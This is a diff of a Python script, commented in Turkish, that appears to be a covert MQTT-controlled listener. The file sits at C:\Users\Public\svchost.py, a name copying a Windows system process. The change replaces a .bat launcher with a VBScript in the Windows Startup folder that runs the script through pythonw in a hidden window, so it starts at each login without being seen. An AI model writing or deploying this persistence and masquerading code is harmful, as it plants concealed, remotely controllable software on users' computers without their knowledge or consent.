@@ -112,29 +112,30 @@ client.connect(MQTT_BROKER, MQTT_PORT, 60)
 import os
 import sys
 
-import os
-import sys
-
 def add_to_startup():
     # 1. Windows Başlangıç (Startup) klasörünün yolunu bul
     appdata = os.getenv('APPDATA')
     startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
     
-    # 2. %PUBLIC% ortam değişkenini Python'da doğru şekilde çöz
-    script_path = os.path.expandvars(r'%PUBLIC%\svchost.py')
+    # 2. Çalışan betiğin tam yolunu al (C:\Users\Public\svchost.py)
+    script_path = os.path.abspath(__file__)
     
-    # 3. Başlangıç klasörüne eklenecek .bat dosyasının yolu
-    bat_path = os.path.join(startup_dir, "myscript_launcher.bat")
+    # 3. .bat yerine .vbs dosyası oluşturuyoruz
+    vbs_path = os.path.join(startup_dir, "myscript_launcher.vbs")
     
-    # 4. Siyah konsol penceresi çıkmadan çalışması için 'pythonw.exe' kullanıyoruz
+    # 4. pythonw.exe yolunu belirle
     pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
     
-    # 5. .bat dosyasını oluştur ve içine çalıştırma komutunu yaz
-    with open(bat_path, "w") as f:
-        f.write(f'@echo off\n"{pythonw_path}" "{script_path}"\n')
+    # 5. VBScript içeriği
+    # En sondaki ', 0' parametresi pencerenin gizli (Hidden) açılmasını sağlar
+    vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n' \
+                  f'WshShell.Run """{pythonw_path}"" ""{script_path}""", 0, False\n'
+    
+    # 6. .vbs dosyasını kaydet
+    with open(vbs_path, "w") as f:
+        f.write(vbs_content)
 
 add_to_startup()
-
 # Sonsuz döngüde dinlemeye başla
 try:
     client.loop_forever()
